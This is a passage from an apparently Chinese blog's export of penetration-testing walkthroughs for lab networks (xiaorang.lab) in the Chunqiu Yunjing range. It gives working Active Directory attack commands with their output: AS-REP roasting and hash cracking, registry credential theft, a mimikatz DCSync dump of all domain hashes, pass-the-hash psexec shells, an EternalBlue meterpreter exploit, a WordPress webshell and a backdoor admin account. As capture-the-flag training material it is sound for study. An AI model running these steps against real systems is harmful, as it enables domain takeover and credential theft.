UF_DONT_REQUIRE_PREAUTH set[-] User xuanjiang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yangju doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User yanglang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yexing doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yifu doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yuanchang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yulvxue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User zhaoxiu doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User zhenjun doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User zhufeng doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) 可以得到了两个用户的密码 1234$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0 用hashcat爆破一下└─# hashcat -m 18200 passhash /usr/share/wordlists/rockyou.txt 12$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa:hellokitty$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0:strawberry wenshao:hellokitty、zhangxin:strawberry 用bloodhound进行信息搜集 12┌──(root㉿kali)-[~/Desktop/tmp]└─# bloodhound-python -u zhangxin -p strawberry -d xiaorang.lab -dc DC-PROGAME.xiaorang.lab -c all --dns-tcp -ns 172.22.6.12 --auth-method ntlm --zip 借一张大佬的图，可以看到WIN2019.XIAORANG.LAB到&#x59;&#85;&#x58;&#85;&#x41;&#78;&#x40;&#88;&#x49;&#65;&#79;&#x52;&#65;&#78;&#x47;&#46;&#x4c;&#x41;&#66;是有HasSession的， HasSession：用户与计算机时进行会话时，凭据会保留在内存中，说明yuxuan这个用户登录过WIN2019 可以直接查看注册表 1234567891011121314151617181920212223242526272829303132333435363738394041424344C:\\Users\\zhangxin\\Desktop&gt;reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon AutoRestartShell REG_DWORD 0x1 Background REG_SZ 0 0 0 CachedLogonsCount REG_SZ 10 DebugServerCommand REG_SZ no DisableBackButton REG_DWORD 0x1 EnableSIHostIntegration REG_DWORD 0x1 ForceUnlockLogon REG_DWORD 0x0 LegalNoticeCaption REG_SZ LegalNoticeText REG_SZ PasswordExpiryWarning REG_DWORD 0x5 PowerdownAfterShutdown REG_SZ 0 PreCreateKnownFolders REG_SZ &#123;A520A1A4-1780-4FF6-BD18-167343C5AF16&#125; ReportBootOk REG_SZ 1 Shell REG_SZ explorer.exe ShellCritical REG_DWORD 0x0 ShellInfrastructure REG_SZ sihost.exe SiHostCritical REG_DWORD 0x0 SiHostReadyTimeOut REG_DWORD 0x0 SiHostRestartCountLimit REG_DWORD 0x0 SiHostRestartTimeGap REG_DWORD 0x0 Userinit REG_SZ C:\\Windows\\system32\\userinit.exe, VMApplet REG_SZ SystemPropertiesPerformance.exe /pagefile WinStationsDisabled REG_SZ 0 ShellAppRuntime REG_SZ ShellAppRuntime.exe scremoveoption REG_SZ 0 DisableCAD REG_DWORD 0x1 LastLogOffEndTimePerfCounter REG_QWORD 0xedd7ccd15 ShutdownFlags REG_DWORD 0x80000027 AutoLogonSID REG_SZ S-1-5-21-3623938633-4064111800-2925858365-1180 LastUsedUsername REG_SZ yuxuan AutoAdminLogon REG_SZ 1 DefaultUserName REG_SZ yuxuan DefaultPassword REG_SZ Yuxuan7QbrgZ3L DefaultDomainName REG_SZ xiaorang.labHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AlternateShellsHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensionsHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserDefaultsHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoLogonCheckedHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\VolatileUserMgrKey 123DefaultUserName REG_SZ yuxuan DefaultPassword REG_SZ Yuxuan7QbrgZ3L DefaultDomainName REG_SZ xiaorang.lab yuxuan用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限 先登录yuxuan用户，然后用mimikatz抓取administrator的哈希 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293C:\\Users\\yuxuan\\Desktop&gt;mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot; .#####. mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36 .## ^ ##. &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#x27;## v ##&#x27; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#x27;#####&#x27; &gt; http://pingcastle.com / http://mysmartlogon.com ***/mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;DC-PROGAME.xiaorang.lab&#x27; will be the DC server[DC] Exporting domain &#x27;xiaorang.lab&#x27;1103 shuzhen 07c1f387d7c2cf37e0ca7827393d2327 5121104 gaiyong 52c909941c823dbe0f635b3711234d2e 5121106 xiqidi a55d27cfa25f3df92ad558c304292f2e 5121107 wengbang 6b1d97a5a68c6c6c9233d11274d13a2e 5121108 xuanjiang a72a28c1a29ddf6509b8eabc61117c6c 5121109 yuanchang e1cea038f5c9ffd9dc323daf35f6843b 5121110 lvhui f58b31ef5da3fc831b4060552285ca54 5121111 wenbo 9abb7115997ea03785e92542f684bdde 5121112 zhenjun 94c84ba39c3ece24b419ab39fdd3de1a 5121113 jinqing 4bf6ad7a2e9580bc8f19323f96749b3a 5121115 yangju 1fa8c6b4307149415f5a1baffebe61cf 5121117 weicheng 796a774eace67c159a65d6b86fea1d01 5121118 weixian 8bd7dc83d84b3128bfbaf165bf292990 5121119 haobei 045cc095cc91ba703c46aa9f9ce93df1 5121120 jizhen 1840c5130e290816b55b4e5b60df10da 5121121 jingze 3c8acaecc72f63a4be945ec6f4d6eeee 5121122 rubao d8bd6484a344214d7e0cfee0fa76df74 5121123 zhaoxiu 694c5c0ec86269daefff4dd611305fab 5121124 tangshun 90b8d8b2146db6456d92a4a133eae225 5121125 liangliang c67cd4bae75b82738e155df9dedab7c1 5121126 qiyue b723d29e23f00c42d97dd97cc6b04bc8 5121127 chouqian c6f0585b35de1862f324bc33c920328d 5121128 jicheng 159ee55f1626f393de119946663a633c 5121129 xiyi ee146df96b366efaeb5138832a75603b 5121130 beijin a587b90ce9b675c9acf28826106d1d1d 5121131 chenghui 08224236f9ddd68a51a794482b0e58b5 5121132 chebin b50adfe07d0cef27ddabd4276b3c3168 5121133 pengyuan a35d8f3c986ab37496896cbaa6cdfe3e 5121134 yanglang 91c5550806405ee4d6f4521ba6e38f22 5121135 jihuan cbe4d79f6264b71a48946c3fa94443f5 5121136 duanmuxiao 494cc0e2e20d934647b2395d0a102fb0 5121137 hongzhi f815bf5a1a17878b1438773dba555b8b 5121138 gaijin b1040198d43631279a63b7fbc4c403af 5121139 yifu 4836347be16e6af2cd746d3f934bb55a 5121140 fusong adca7ec7f6ab1d2c60eb60f7dca81be7 5121141 luwan c5b2b25ab76401f554f7e1e98d277a6a 5121142 tangrong 2a38158c55abe6f6fe4b447fbc1a3e74 5121143 zhufeng 71e03af8648921a3487a56e4bb8b5f53 5121145 dongcheng f2fdf39c9ff94e24cf185a00bf0a186d 5121146 lianhuangchen 23dc8b3e465c94577aa8a11a83c001af 5121147 lili b290a36500f7e39beee8a29851a9f8d5 5121148 huabi 02fe5838de111f9920e5e3bb7e009f2f 5121149 rangsibo 103d0f70dc056939e431f9d2f604683c 5121150 wohua cfcc49ec89dd76ba87019ca26e5f7a50 5121151 haoguang 33efa30e6b3261d30a71ce397c779fda 5121152 langying 52a8a125cd369ab16a385f3fcadc757d 5121153 diaocai a14954d5307d74cd75089514ccca097a 5121154 lianggui 4ae2996c7c15449689280dfaec6f2c37 5121155 manxue 0255c42d9f960475f5ad03e0fee88589 5121156 baqin 327f2a711e582db21d9dd6d08f7bdf91 5121157 chengqiu 0d0c1421edf07323c1eb4f5665b5cb6d 5121158 louyou a97ba112b411a3bfe140c941528a4648 5121159 maqun 485c35105375e0754a852cee996ed33b 5121160 wenbiao 36b6c466ea34b2c70500e0bfb98e68bc 5121161 weishengshan f60a4233d03a2b03a7f0ae619c732fae 5121163 chuyuan 0cfdca5c210c918b11e96661de82948a 5121164 wenliang a4d2bacaf220292d5fdf9e89b3513a5c 5121165 yulvxue cf970dea0689db62a43b272e2c99dccd 5121166 luyue 274d823e941fc51f84ea323e22d5a8c4 5121167 ganjian 7d3c39d94a272c6e1e2ffca927925ecc 5121168 pangzhen 51d37e14983a43a6a45add0ae8939609 5121169 guohong d3ce91810c1f004c782fe77c90f9deb6 5121170 lezhong dad3990f640ccec92cf99f3b7be092c7 5121171 sheweiyue d17aecec7aa3a6f4a1e8d8b7c2163b35 5121172 dujian 8f7846c78f03bf55685a697fe20b0857 5121173 lidongjin 34638b8589d235dea49e2153ae89f2a1 5121174 hongqun 6c791ef38d72505baeb4a391de05b6e1 5121175 yexing 34842d36248c2492a5c9a1ae5d850d54 5121176 maoda 6e65c0796f05c0118fbaa8d9f1309026 5121177 qiaomei 6a889f350a0ebc15cf9306687da3fd34 512502 krbtgt a4206b127773884e2c7ea86cdd282d9c 514500 Administrator 04d93ffd6f5f6e4490e0de23f240a5e9 5121000 DC-PROGAME$ b1f83a8f5daf6f7825f6a69d98c8f364 5324801180 yuxuan 376ece347142d1628632d440530e8eed 660481181 WIN2019$ 5447da4f138ae51f887cf24e79a9eba3 40961178 wenshao b31c6aa5660d6e87ee046b1bb5d0ff79 42603521179 zhangxin d6c5976e07cdb410be19b84126367e3d 4260352mimikatz(commandline) # exitBye! 有了administrator的密码了，就相当于控制域控了，登录一下其他的机器type flag就行了 FLAG3、4flag03在172.22.6.25的C:\\Users\\Administrator\\flag\\下 flag04在172.22.6.12的C:\\Users\\Administrator\\flag\\下 123456789101112131415161718192021222324252627282930313233┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-psexec xiaorang.lab/administrator@172.22.6.12 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -codec gbkImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 172.22.6.12.....[*] Found writable share ADMIN$[*] Uploading file FFcjQxtS.exe[*] Opening SVCManager on 172.22.6.12.....[*] Creating service kiNB on 172.22.6.12.....[*] Starting service kiNB.....[!] Press help for extra shell commandsMicrosoft Windows [版本 10.0.14393](c) 2016 Microsoft Corporation。保留所有权利。C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\flag\\flag*┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-psexec xiaorang.lab/administrator@172.22.6.25 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -codec gbkImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 172.22.6.25.....[*] Found writable share ADMIN$[*] Uploading file GRqsuULo.exe[*] Opening SVCManager on 172.22.6.25.....[*] Creating service VUIl on 172.22.6.25.....[*] Starting service VUIl.....[!] Press help for extra shell commandsMicrosoft Windows [版本 10.0.17763.3046](c) 2018 Microsoft Corporation。保留所有权利。C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\flag\\flag*","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-2022网鼎杯半决赛复盘","slug":"春秋云镜-2022网鼎杯半决赛复盘","date":"2025-04-02T06:04:44.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/04/02/春秋云镜-2022网鼎杯半决赛复盘/","permalink":"https://lvzhouhang.xyz/2025/04/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/","excerpt":"","text":"1234567891011┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 39.98.112.16 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-02 02:06 EDTNmap scan report for 39.98.112.16Host is up (0.00020s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 135.21 seconds 只开了一个 22 端口和 80 端口 访问 80 端口，很明显的 wordpress 框架 用 wpscan 扫描可以扫描到一个 admin 用户，爆破密码可以爆破出来 admin 的密码是 123456 12[!] Valid Combinations Found: | Username: admin, Password: 123456 进入后台之后修改主题文件 getshell 访问/wp-content/themes/twentytwentyone/404.php，蚁剑连接 flag01 在根目录 查看网络信息，然后上传 fscan 进行内网扫描 12345678910111213(www-data:/tmp) $ ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 :: 1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e: 2d: a8: bd brd ff: ff: ff: ff: ff: ff inet 172.22.15.26/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 1892159075sec preferred_lft 1892159075sec inet6 fe80:: 216:3eff: fe2d: a8bd/64 scope link valid_lft forever preferred_lft forever 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768$ ./fscan -h 172.22.15.26/16 -time 10 ___ _ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ // /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt;\\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ fscan version: 1.8.2start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.15.13 is alive(icmp) Target 172.22.15.18 is alive(icmp) Target 172.22.15.24 is alive(icmp) Target 172.22.15.35 is alive[*] Icmp alive hosts len is: 4172.22.15.24:3306 open172.22.15.35:445 open172.22.15.13:445 open172.22.15.18:445 open172.22.15.35:139 open172.22.15.24:139 open172.22.15.18:139 open172.22.15.13:139 open172.22.15.35:135 open172.22.15.24:135 open172.22.15.13:135 open172.22.15.18:135 open172.22.15.24:80 open172.22.15.18:80 open172.22.15.24:445 open172.22.15.13:88 open[*] alive ports len is: 16start vulscan[*] NetInfo:[*]172.22.15.24 [-&gt;] XR-WIN08 [-&gt;] 172.22.15.24[*] NetInfo:[*]172.22.15.35 [-&gt;] XR-0687 [-&gt;] 172.22.15.35[*] NetBios: 172.22.15.35 XIAORANG\\XR-0687[*] NetInfo:[*]172.22.15.18 [-&gt;] XR-CA [-&gt;] 172.22.15.18[*] NetInfo:[*]172.22.15.13 [-&gt;] XR-DC01 [-&gt;] 172.22.15.13[+] 172.22.15.24 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] 172.22.15.13 (Windows Server 2016 Standard 14393)[*] NetBios: 172.22.15.13 [+]DC XR-DC01.xiaorang.lab Windows Server 2016 Standard 14393[*] NetBios: 172.22.15.24 WORKGROUP\\XR-WIN08 Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] Webtoc: truetitle: http://172.22.15.18 code: 200 len: 703 toc: truetitle: IIS Windows Server[*] NetBios: 172.22.15.18 XR-CA.xiaorang.lab Windows Server 2016 Standard 14393[*] Webtoc: truetitle: http://172.22.15.24 code: 302 len: 0 toc: truetitle: None 跳转 url: http://172.22.15.24/www[*] Webtoc: truetitle: http://172.22.15.24/www/sys/index.php code: 200 len: 135 toc: truetitle: None[+] http://172.22.15.18 poc-yaml-active-directory-certsrv-detect已完成 16/16[*] 扫描结束, 耗时: 23.238579924s 可以发现 172.22.15.24 存在 MS17-010 漏洞，直接上 msf，但是用 msf 梭哈之前需要先搭建一层代理，可以用 Venom 搭建很方便 12345proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcpset rhosts 172.22.15.24exploit flag02 在 C:\\users\\administrator\\flag 里，添加一个新用户然后远程桌面连接 12net user ll Asd123123 /addnet localgroup administrators ll /add 可以看到数据库的密码，这个站点还存在一个 phpmyadmin，尝试登录 root:root@#123，将 zdoo 库里面的 user 表导出来 123456789101112131415161718#域内用户lixiuying@xiaorang.labjiaxiaoliang@xiaorang.labwanglihong@xiaorang.labhuachunmei@xiaorang.labzhangxinyu@xiaorang.labhuzhigang@xiaorang.lablihongxia@xiaorang.labwangyulan@xiaorang.labchenjianhua@xiaorang.labzhangyi@xiaorang.labzhangli@xiaorang.labzhangwei@xiaorang.labliuqiang@xiaorang.labwangfang@xiaorang.labwangwei@xiaorang.lablixiaoliang@xiaorang.labwanghao@xiaorang.lab 将获得的账号放进 user.txt 里 使用 AS-REP Roasting 攻击，尝试获取用户的密码 1234567891011121314151617181920212223242526┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.15.13 -usersfile users.txt -format hashcat[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: 